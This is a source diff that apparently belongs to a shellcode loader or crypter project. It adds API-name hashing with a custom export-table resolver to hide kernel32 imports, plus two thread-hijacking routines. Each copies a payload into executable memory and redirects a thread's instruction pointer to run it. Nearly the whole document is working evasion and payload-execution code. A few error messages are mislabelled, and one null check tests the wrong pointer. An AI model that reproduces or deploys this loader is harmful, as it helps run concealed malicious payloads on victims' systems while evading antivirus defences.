@@ -1,5 +1,73 @@
 #include "Cloak.hpp"
 
+#ifdef HASH_API
+constexpr int RandomCompileTimeSeed(void)
+{
+	return '0' * -23784 +
+		__TIME__[7] * 345 +
+		__TIME__[6] * 12 +
+		__TIME__[4] * 2345123 +
+		__TIME__[3] * 623 +
+		__TIME__[1] * 95897 +
+		__TIME__[0] * 2;
+};
+
+constexpr auto g_KEY = RandomCompileTimeSeed() % RAND;
+
+constexpr DWORD HashStringCrc32(const char* String) {
+	UINT32      uMask	= 0x00;
+    UINT32      uHash	= g_KEY;
+	INT         i		= 0x00;
+
+	while ( String[i] != 0 ) {
+		uHash = uHash ^ ( UINT32 ) String[i];
+
+		for ( int ii = 0; ii < 8; ii++ ) {
+			uMask = -1 * ( uHash & 1 );
+			uHash = ( uHash >> 1 ) ^ ( 0xEDB88320 & uMask );
+		}
+
+		i++;
+	}
+
+	return ~uHash;
+}
+
+#define RTIME_HASHA( API ) HashStringCrc32( ( const char* ) API )
+#define CTIME_HASHA( API ) constexpr auto API##_CRC32A = HashStringCrc32( ( const char* ) #API );
+
+FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {
+	PBYTE pBase = ( PBYTE ) hModule;
+
+	PIMAGE_DOS_HEADER   pImgDosHeader  = ( PIMAGE_DOS_HEADER ) pBase;
+	if ( pImgDosHeader->e_magic != IMAGE_DOS_SIGNATURE ) {
+        return NULL;
+    }
+
+	PIMAGE_NT_HEADERS   pImgNtHeaders  = ( PIMAGE_NT_HEADERS ) ( pBase + pImgDosHeader->e_lfanew );
+	if ( pImgNtHeaders->Signature != IMAGE_NT_SIGNATURE ) {
+		return NULL;
+    }
+
+	IMAGE_OPTIONAL_HEADER		ImgOptionalHeader		= pImgNtHeaders->OptionalHeader;
+	PIMAGE_EXPORT_DIRECTORY		pImgExportDirectory     = ( PIMAGE_EXPORT_DIRECTORY ) ( pBase + ImgOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );
+	PDWORD						pdwFunctionNameArray	= ( PDWORD ) ( pBase + pImgExportDirectory->AddressOfNames );
+	PDWORD						pdwFunctionAddressArray	= ( PDWORD ) ( pBase + pImgExportDirectory->AddressOfFunctions );
+	PWORD						pwFunctionOrdinalArray	= ( PWORD ) ( pBase + pImgExportDirectory->AddressOfNameOrdinals );
+
+	for ( DWORD i = 0; i < pImgExportDirectory->NumberOfFunctions; i++ ) {
+		CHAR*	pFunctionName		= ( CHAR* ) ( pBase + pdwFunctionNameArray[i] );
+		PVOID	pFunctionAddr   	= ( PVOID ) ( pBase + pdwFunctionAddressArray[pwFunctionOrdinalArray[i]] );
+
+		if ( dwApiNameHash == RTIME_HASHA( pFunctionName ) ) { 
+			return ( FARPROC ) pFunctionAddr;
+		}
+	}
+
+	return NULL;
+}
+#endif // !HASH_API
+
 #ifdef LOCAL_THREAD_HIJACK
 
 VOID GottaCatchEmAll() {
@@ -8,6 +76,195 @@ VOID GottaCatchEmAll() {
     int k = i + j;
     int l = k * i / j;
 }
+
+#ifdef HASH_API
+
+typedef HANDLE ( WINAPI * fnCreateThread ) (
+    LPSECURITY_ATTRIBUTES   lpThreadAttribute,
+    SIZE_T                  dwStackSize,
+    LPTHREAD_START_ROUTINE  lpStartAddress,
+    LPVOID                  lpParameter,
+    DWORD                   dwCreationFlags,
+    LPDWORD                 lpThreadId
+);
+
+typedef LPVOID ( WINAPI * fnVirtualAlloc ) (
+    LPVOID  lpAddress,
+    SIZE_T  dwSize,
+    DWORD   flAllocationType,
+    DWORD   flProtect
+);
+
+typedef BOOL ( WINAPI * fnVirtualProtect ) (
+    LPVOID  lpAddress,
+    SIZE_T  dwSize,
+    DWORD   flNewProtect,
+    PDWORD  lpflOldProtect
+);
+
+typedef BOOL ( WINAPI * fnGetThreadContext ) (
+    HANDLE      hThread,
+    LPCONTEXT   lpContext
+);
+
+typedef BOOL ( WINAPI * fnSetThreadContext ) (
+    HANDLE              hThread,
+    const CONTEXT       *lpContext
+);
+
+typedef DWORD ( WINAPI * fnResumeThread ) (
+    HANDLE  hThread
+);
+
+typedef DWORD ( WINAPI * fnWaitForSingleObject ) (
+    HANDLE  hHandle,
+    DWORD   dwMilliseconds
+);
+
+CTIME_HASHA(CreateThread)
+CTIME_HASHA(VirtualAlloc)
+CTIME_HASHA(VirtualProtect)
+CTIME_HASHA(GetThreadContext)
+CTIME_HASHA(SetThreadContext)
+CTIME_HASHA(ResumeThread)
+CTIME_HASHA(WaitForSingleObject)
+
+BOOL LocalThreadHijack(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
+    
+    HMODULE hKernel32 = NULL;
+
+    if ( ( hKernel32 = LoadLibraryA( "KERNEL32.DLL" ) ) == NULL ) {
+        #ifdef DEBUG
+        printf( "[-] LoadLibraryA Failed with Error -> %d\n", GetLastError() );
+        #endif // !DEBUG
+        
+        return FALSE;
+    }
+
+    fnCreateThread pCreateThread = ( fnCreateThread ) GetProcAddressH( hKernel32, CreateThread_CRC32A );
+    if ( pCreateThread == NULL ) {
+        #ifdef DEBUG
+        printf( "[-] Unable to get address for CreateThread\n" );
+        #endif // !DEBUG
+        
+        return FALSE;
+    }
+
+    fnVirtualAlloc pVirtualAlloc = ( fnVirtualAlloc ) GetProcAddressH( hKernel32, VirtualAlloc_CRC32A );
+    if ( pVirtualAlloc == NULL ) {
+        #ifdef DEBUG
+        printf( "[-] Unable to get address for VirtualAlloc\n" );
+        #endif // !DEBUG
+        
+        return FALSE;
+    }
+
+    fnVirtualProtect pVirtualProtect = ( fnVirtualProtect ) GetProcAddressH( hKernel32, VirtualProtect_CRC32A );
+    if ( pVirtualProtect == NULL ) {
+        #ifdef DEBUG
+        printf( "[-] Unable to get address for VirtualProtect\n" );
+        #endif // !DEBUG
+        
+        return FALSE;
+    }
+
+    fnGetThreadContext pGetThreadContext = ( fnGetThreadContext ) GetProcAddressH( hKernel32, GetThreadContext_CRC32A );
+    if ( pGetThreadContext == NULL ) {
+        #ifdef DEBUG
+        printf( "[-] Unable to get address for GetThreadContext\n" );
+        #endif // !DEBUG
+        
+        return FALSE;
+    }
+
+    fnSetThreadContext pSetThreadContext = ( fnSetThreadContext ) GetProcAddressH( hKernel32, SetThreadContext_CRC32A );
+    if ( pSetThreadContext == NULL ) {
+        #ifdef DEBUG
+        printf( "[-] Unable to get address for SetThreadContext\n" );
+        #endif // !DEBUG
+        
+        return FALSE;
+    }
+
+    fnResumeThread pResumeThread = ( fnResumeThread ) GetProcAddressH( hKernel32, ResumeThread_CRC32A );
+    if ( pResumeThread == NULL ) {
+        #ifdef DEBUG
+        printf( "[-] Unable to get address for ResumeThread\n" );
+        #endif // !DEBUG
+        
+        return FALSE;
+    }
+
+    fnWaitForSingleObject pWaitForSingleObject = ( fnWaitForSingleObject ) GetProcAddressH( hKernel32, WaitForSingleObject_CRC32A );
+    if ( pWaitForSingleObject == NULL ) {
+        #ifdef DEBUG
+        printf( "[-] Unable to get address for WaitForSingleObject\n" );
+        #endif // !DEBUG
+        
+        return FALSE;
+    }
+
+    // ---
+
+    DWORD   dwOldProtect        = NULL;
+    PVOID   pPayloadAddress     = NULL;
+    HANDLE  hThread             = NULL;
+    CONTEXT cThreadContext      = { .ContextFlags = CONTEXT_CONTROL };
+
+    hThread = pCreateThread( NULL, NULL, ( LPTHREAD_START_ROUTINE ) &GottaCatchEmAll, NULL, CREATE_SUSPENDED, NULL );
+    if ( hThread == NULL ) {
+        #ifdef DEBUG
+        printf( "[-] CreateThread Failed with Error -> %d\n", GetLastError() );
+        #endif // !DEBUG
+        
+        return FALSE;
+    }
+
+    pPayloadAddress = pVirtualAlloc( NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
+    if ( pPayloadAddress == NULL ) {
+        #ifdef DEBUG
+        printf( "[-] VirtualAlloc Failed with Error -> %d\n", GetLastError() );
+        #endif // !DEBUG
+        
+        return FALSE;
+    }
+
+    memcpy( pPayloadAddress, pbPayload, sPayloadSize );
+
+    if ( ! pVirtualProtect( pPayloadAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtect ) ) {
+        #ifdef DEBUG
+        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
+        #endif // !DEBUG
+        
+        return FALSE;
+    }
+
+    if ( ! pGetThreadContext( hThread, &cThreadContext ) ) {
+        #ifdef DEBUG
+        printf( "[-] GetThreadContext Failed with Error -> %d\n", GetLastError() );
+        #endif // !DEBUG
+        
+        return FALSE;
+    }
+
+    cThreadContext.Rip = ( DWORD64 ) pPayloadAddress;
+
+    if ( ! pSetThreadContext( hThread, &cThreadContext ) ) {
+        #ifdef DEBUG
+        printf( "[-] SetThreadContext Failed with Error -> %d\n", GetLastError() );
+        #endif // !DEBUG
+        
+        return FALSE;
+    }
+
+    pResumeThread( hThread );
+
+    pWaitForSingleObject( hThread, WAIT_TIME );
+
+    return TRUE;
+}
+
+#else
 
 BOOL LocalThreadHijack(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
     DWORD   dwOldProtect        = NULL;
@@ -68,11 +325,345 @@ BOOL LocalThreadHijack(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
     return TRUE;
 }
 
+#endif // !HASH_API
+
 #endif // !LOCAL_THREAD_HIJACK
 
 #ifdef LOCAL_THREAD_HIJACK_ENUM
 
 #include <tlhelp32.h>
+
+#ifdef HASH_API
+
+typedef DWORD ( WINAPI * fnGetCurrentProcessId ) ();
+
+typedef DWORD ( WINAPI * fnGetCurrentThreadId ) ();
+
+typedef HANDLE ( WINAPI * fnCreateToolhelp32Snapshot) (
+    DWORD   dwFlags,
+    DWORD   th32ProcessId
+);
+
+typedef BOOL ( WINAPI * fnThread32First ) (
+    HANDLE          hSnapshot,
+    LPTHREADENTRY32 lpte
+);
+
+typedef BOOL ( WINAPI * fnCloseHandle ) (
+    HANDLE  hObject
+);
+
+typedef HANDLE ( WINAPI * fnOpenThread ) (
+    DWORD   dwDesiredAccess,
+    BOOL    bInheritHandle,
+    DWORD   dwThreadId
+);
+
+typedef BOOL ( WINAPI * fnThread32Next ) (
+    HANDLE          hSnapshot,
+    LPTHREADENTRY32 lpte
+);
+
+typedef LPVOID ( WINAPI * fnVirtualAlloc ) (
+    LPVOID  lpAddress,
+    SIZE_T  dwSize,
+    DWORD   flAllocationType,
+    DWORD   flProtect
+);
+
+typedef BOOL ( WINAPI * fnVirtualProtect ) (
+    LPVOID  lpAddress,
+    SIZE_T  dwSize,
+    DWORD   flNewProtect,
+    PDWORD  lpflOldProtect
+);
+
+typedef DWORD ( WINAPI * fnSuspendThread ) (
+    HANDLE  hThread
+);
+
+typedef BOOL ( WINAPI * fnGetThreadContext ) (
+    HANDLE      hThread,
+    LPCONTEXT   lpContext
+);
+
+typedef BOOL ( WINAPI * fnSetThreadContext ) (
+    HANDLE              hThread,
+    const CONTEXT       *lpContext
+);
+
+typedef DWORD ( WINAPI * fnResumeThread ) (
+    HANDLE  hThread
+);
+
+typedef DWORD ( WINAPI * fnWaitForSingleObject ) (
+    HANDLE  hHandle,
+    DWORD   dwMilliseconds
+);
+
+CTIME_HASHA(GetCurrentProcessId)
+CTIME_HASHA(GetCurrentThreadId)
+CTIME_HASHA(CreateToolhelp32Snapshot)
+CTIME_HASHA(Thread32First)
+CTIME_HASHA(CloseHandle)
+CTIME_HASHA(OpenThread)
+CTIME_HASHA(Thread32Next)
+CTIME_HASHA(VirtualAlloc)
+CTIME_HASHA(VirtualProtect)
+CTIME_HASHA(SuspendThread)
+CTIME_HASHA(GetThreadContext)
+CTIME_HASHA(SetThreadContext)
+CTIME_HASHA(ResumeThread)
+CTIME_HASHA(WaitForSingleObject)
+
+BOOL LocalThreadHijack(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
+    
+    HMODULE hKernel32 = NULL;
+
+    if ( ( hKernel32 = LoadLibraryA( "KERNEL32.DLL" ) ) == NULL ) {
+        #ifdef DEBUG
+        printf( "[-] LoadLibraryA Failed with Error -> %d\n", GetLastError() );
+        #endif // !DEBUG
+        
+        return FALSE;
+    }
+
+    fnGetCurrentProcessId pGetCurrentProcessId = ( fnGetCurrentProcessId ) GetProcAddressH( hKernel32, GetCurrentProcessId_CRC32A );
+    if ( pGetCurrentProcessId == NULL ) {
+        #ifdef DEBUG
+        printf( "[-] Unable to get address for pGetCurrentProcessId\n" );
+        #endif // !DEBUG
+        
+        return FALSE;
+    }
+
+    fnGetCurrentThreadId pGetCurrentThreadId = ( fnGetCurrentThreadId ) GetProcAddressH( hKernel32, GetCurrentThreadId_CRC32A );
+    if ( pGetCurrentProcessId == NULL ) {
+        #ifdef DEBUG
+        printf( "[-] Unable to get address for pGetCurrentThreadId\n" );
+        #endif // !DEBUG
+        
+        return FALSE;
+    }
+
+    fnCreateToolhelp32Snapshot pCreateToolhelp32Snapshot = ( fnCreateToolhelp32Snapshot ) GetProcAddressH( hKernel32, CreateToolhelp32Snapshot_CRC32A );
+    if ( pCreateToolhelp32Snapshot == NULL ) {
+        #ifdef DEBUG
+        printf( "[-] Unable to get address for pCreateToolhelp32Snapshot\n" );
+        #endif // !DEBUG
+        
+        return FALSE;
+    }
+
+    fnThread32First pThread32First = ( fnThread32First ) GetProcAddressH( hKernel32, Thread32First_CRC32A );
+    if ( pThread32First == NULL ) {
+        #ifdef DEBUG
+        printf( "[-] Unable to get address for pThread32First\n" );
+        #endif // !DEBUG
+        
+        return FALSE;
+    }
+
+    fnCloseHandle pCloseHandle = ( fnCloseHandle ) GetProcAddressH( hKernel32, CloseHandle_CRC32A );
+    if ( pCloseHandle == NULL ) {
+        #ifdef DEBUG
+        printf( "[-] Unable to get address for pCloseHandle\n" );
+        #endif // !DEBUG
+        
+        return FALSE;
+    }
+
+    fnOpenThread pOpenThread = ( fnOpenThread ) GetProcAddressH( hKernel32, OpenThread_CRC32A );
+    if ( pOpenThread == NULL ) {
+        #ifdef DEBUG
+        printf( "[-] Unable to get address for pOpenThread\n" );
+        #endif // !DEBUG
+        
+        return FALSE;
+    }
+
+    fnThread32Next pThread32Next = ( fnThread32Next ) GetProcAddressH( hKernel32, Thread32Next_CRC32A );
+    if ( pThread32Next == NULL ) {
+        #ifdef DEBUG
+        printf( "[-] Unable to get address for pThread32Next\n" );
+        #endif // !DEBUG
+        
+        return FALSE;
+    }
+
+    fnVirtualAlloc pVirtualAlloc = ( fnVirtualAlloc ) GetProcAddressH( hKernel32, VirtualAlloc_CRC32A );
+    if ( pVirtualAlloc == NULL ) {
+        #ifdef DEBUG
+        printf( "[-] Unable to get address for VirtualAlloc\n" );
+        #endif // !DEBUG
+        
+        return FALSE;
+    }
+
+    fnVirtualProtect pVirtualProtect = ( fnVirtualProtect ) GetProcAddressH( hKernel32, VirtualProtect_CRC32A );
+    if ( pVirtualProtect == NULL ) {
+        #ifdef DEBUG
+        printf( "[-] Unable to get address for VirtualProtect\n" );
+        #endif // !DEBUG
+        
+        return FALSE;
+    }
+
+    fnSuspendThread pSuspendThread = ( fnSuspendThread ) GetProcAddressH( hKernel32, SuspendThread_CRC32A );
+    if ( pSuspendThread == NULL ) {
+        #ifdef DEBUG
+        printf( "[-] Unable to get address for pSuspendThread\n" );
+        #endif // !DEBUG
+        
+        return FALSE;
+    }
+
+    fnGetThreadContext pGetThreadContext = ( fnGetThreadContext ) GetProcAddressH( hKernel32, GetThreadContext_CRC32A );
+    if ( pGetThreadContext == NULL ) {
+        #ifdef DEBUG
+        printf( "[-] Unable to get address for GetThreadContext\n" );
+        #endif // !DEBUG
+        
+        return FALSE;
+    }
+
+    fnSetThreadContext pSetThreadContext = ( fnSetThreadContext ) GetProcAddressH( hKernel32, SetThreadContext_CRC32A );
+    if ( pSetThreadContext == NULL ) {
+        #ifdef DEBUG
+        printf( "[-] Unable to get address for SetThreadContext\n" );
+        #endif // !DEBUG
+        
+        return FALSE;
+    }
+
+    fnResumeThread pResumeThread = ( fnResumeThread ) GetProcAddressH( hKernel32, ResumeThread_CRC32A );
+    if ( pResumeThread == NULL ) {
+        #ifdef DEBUG
+        printf( "[-] Unable to get address for ResumeThread\n" );
+        #endif // !DEBUG
+        
+        return FALSE;
+    }
+
+    fnWaitForSingleObject pWaitForSingleObject = ( fnWaitForSingleObject ) GetProcAddressH( hKernel32, WaitForSingleObject_CRC32A );
+    if ( pWaitForSingleObject == NULL ) {
+        #ifdef DEBUG
+        printf( "[-] Unable to get address for WaitForSingleObject\n" );
+        #endif // !DEBUG
+        
+        return FALSE;
+    }
+
+    // ---
+
+    DWORD           dwMainThread        = NULL;
+    DWORD           dwTargetThread      = NULL;
+    HANDLE          hThread             = NULL;
+    PVOID           pPayloadAddress     = NULL;
+    DWORD           dwPid               = pGetCurrentProcessId();
+    DWORD           dwOldProtect        = NULL;
+    HANDLE          hSnapshot           = NULL;
+    THREADENTRY32   teThread            = { .dwSize = sizeof( THREADENTRY32 ) };
+    CONTEXT         cThreadContext      = { .ContextFlags = CONTEXT_CONTROL };
+
+
+    dwMainThread = pGetCurrentThreadId();
+
+    hSnapshot = pCreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, NULL );
+    if ( hSnapshot == INVALID_HANDLE_VALUE ) {
+        #ifdef DEBUG
+        printf( "[-] CreateToolhelp32Snapshot Failed with Error -> %d\n", GetLastError() );
+        #endif // !DEBUG
+
+        return FALSE;
+    }
+
+    if ( ! pThread32First( hSnapshot, &teThread ) ) {
+        #ifdef DEBUG
+        printf( "[-] Thread32First Failed with Error -> %d\n", GetLastError() );
+        #endif // !DEBUG
+
+        pCloseHandle(hSnapshot);
+
+        return FALSE;
+    }
+
+    do {
+
+        if ( teThread.th32OwnerProcessID == dwPid && teThread.th32ThreadID != dwMainThread ) {
+
+            dwTargetThread = teThread.th32ThreadID;
+            hThread = pOpenThread( THREAD_ALL_ACCESS, FALSE, teThread.th32ThreadID );
+            if ( hThread == NULL ) {
+                #ifdef DEBUG
+                printf( "[-] OpenThread Failed with Error -> %d\n", GetLastError() );
+                #endif // !DEBUG
+
+                pCloseHandle(hSnapshot);
+
+                return FALSE;
+            }
+
+            break;
+
+        }
+
+    } while ( pThread32Next( hSnapshot, &teThread ) );
+
+    pCloseHandle(hSnapshot);
+
+    if (dwTargetThread == NULL || hThread == NULL) {
+	    return FALSE;
+    }
+
+    pPayloadAddress = pVirtualAlloc( NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
+    if ( pPayloadAddress == NULL ) {
+        #ifdef DEBUG
+        printf( "[-] VirtualAlloc Failed with Error -> %d\n", GetLastError() );
+        #endif // !DEBUG
+        
+        return FALSE;
+    }
+
+    memcpy( pPayloadAddress, pbPayload, sPayloadSize );
+
+    if ( ! pVirtualProtect( pPayloadAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtect ) ) {
+        #ifdef DEBUG
+        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
+        #endif // !DEBUG
+        
+        return FALSE;
+    }
+
+    pSuspendThread( hThread );
+
+    if ( ! pGetThreadContext( hThread, &cThreadContext ) ) {
+        #ifdef DEBUG
+        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
+        #endif // !DEBUG
+        
+        return FALSE;
+    }
+
+    cThreadContext.Rip = ( DWORD64 ) pPayloadAddress;
+
+    if ( ! pSetThreadContext( hThread, &cThreadContext ) ) {
+        #ifdef DEBUG
+        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
+        #endif // !DEBUG
+        
+        return FALSE;
+    }
+
+    pResumeThread( hThread );
+
+    pWaitForSingleObject( hThread, WAIT_TIME );
+
+    return TRUE;
+}
+
+
+#else
 
 BOOL LocalThreadHijack(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
     DWORD           dwMainThread        = NULL;
@@ -180,5 +771,7 @@ BOOL LocalThreadHijack(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
 
     return TRUE;
 }
+
+#endif // !HASH_API
 
 #endif // !LOCAL_THREAD_HIJACK_ENUM
